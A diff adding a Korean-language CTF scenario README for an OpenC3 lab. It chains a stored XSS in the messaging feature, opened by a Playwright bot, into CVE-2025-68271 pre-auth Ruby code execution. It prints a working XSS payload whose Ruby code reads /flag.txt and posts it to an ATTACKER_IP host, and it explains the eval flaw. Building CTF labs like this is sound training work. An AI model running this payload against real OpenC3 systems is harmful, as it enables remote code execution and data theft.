@@ -1,0 +1,68 @@
+# CTF 시나리오: OpenC3 쪽지 XSS → CVE-2025-68271 RCE → Flag 탈취
+
+## 전체 공격 체인
+
+```
+공격자 이메일 발송
+  → 이메일 포워딩 데몬 (ctf-email-daemon)
+  → OpenC3 쪽지 DB (Redis)
+  → 관제사 봇 (ctf-operator-bot, Playwright)이 쪽지 클릭
+  → XSS 페이로드 브라우저 실행
+  → CVE-2025-68271: POST /openc3-api/api (pre-auth RCE)
+  → Ruby 코드: File.read('/flag.txt') → HTTP 전송
+  → 공격자 서버에 flag 수신
+```
+
+## 서비스 구성
+
+| 서비스 | 역할 |
+|--------|------|
+| `ctf-email-daemon` | Gmail IMAP 폴링 → OpenC3 쪽지 API POST |
+| `ctf-operator-bot` | Playwright 브라우저 봇 (쪽지 주기적 열람) |
+| `/flag.txt` | OpenC3 cmd-tlm-api 컨테이너 내 flag 파일 |
+
+## 환경변수 설정 (.env)
+
+```env
+CTF_EMAIL_USER=ctf-controller@gmail.com
+CTF_EMAIL_PASS=<Gmail 앱 비밀번호>
+CTF_BOT_USERNAME=operator
+CTF_BOT_PASSWORD=operator
+```
+
+## 공격자 XSS 페이로드 예시
+
+공격자는 아래 HTML을 담은 이메일을 `ctf-controller@gmail.com`으로 발송:
+
+```html
+<img src="x" onerror="
+(function(){
+  var ruby = 'require(\'net/http\'); f=File.read(\'/flag.txt\'); Net::HTTP.post(URI(\'http://ATTACKER_IP:9999/\'), f); [1]';
+  fetch('/openc3-api/api', {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json-rpc'},
+    body: JSON.stringify({
+      jsonrpc: '2.0',
+      method: 'cmd',
+      params: ['INST ABORT with PARAM [' + ruby + ']'],
+      keyword_params: {scope: 'DEFAULT'},
+      id: 1
+    })
+  });
+})();
+">
+```
+
+## 왜 봇은 Python/curl이 아닌 Playwright여야 하는가?
+
+- Python `requests` / `curl`은 JavaScript를 **실행하지 않음**
+- 쪽지 본문의 XSS 페이로드는 **브라우저 JS 엔진**에서만 실행됨
+- Playwright는 실제 Chromium을 구동하므로 `v-html`로 삽입된 악성 스크립트가 실행됨
+- 봇 브라우저는 OpenC3에 인증된 세션을 가지고 있음 (쿠키/토큰)
+
+## 취약점 요약
+
+1. **Stored XSS**: 쪽지 `body` 필드를 HTML 그대로 `v-html`로 렌더링 (필터 없음)
+2. **CVE-2025-68271**: `/openc3-api/api` JSON-RPC `cmd` 메서드에서
+   `convert_to_value()`가 `[...]` 패턴 값을 `eval()`로 처리 →
+   `authorize()` 호출 이전에 임의 Ruby 코드 실행
